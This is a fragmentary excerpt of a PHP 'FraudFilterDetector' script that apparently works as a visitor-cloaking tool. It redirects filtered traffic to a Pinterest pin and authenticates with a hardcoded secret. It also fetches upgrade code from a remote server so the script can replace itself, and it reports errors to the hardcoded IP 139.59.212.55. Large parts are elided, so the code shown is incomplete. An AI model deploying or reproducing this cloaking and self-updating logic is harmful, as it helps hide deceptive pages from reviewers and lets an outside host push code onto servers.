...
class FraudFilterDetector_arg8o {
    ...
    function isSignatureValid($sign, $time) {
        $str = '46e4c108-fc8d-48d2-83a8-a1849af50bcf.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.pinterest.de/pin/289919294738246958/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 46e4c108-fc8d-48d2-83a8-a1849af50bcf',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 46e4c108-fc8d-48d2-83a8-a1849af50bcf';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 46e4c108-fc8d-48d2-83a8-a1849af50bcf';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=arg8o&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_arg8o = new FraudFilterDetector_arg8o();
$fraudFilterDetector_arg8o->check();
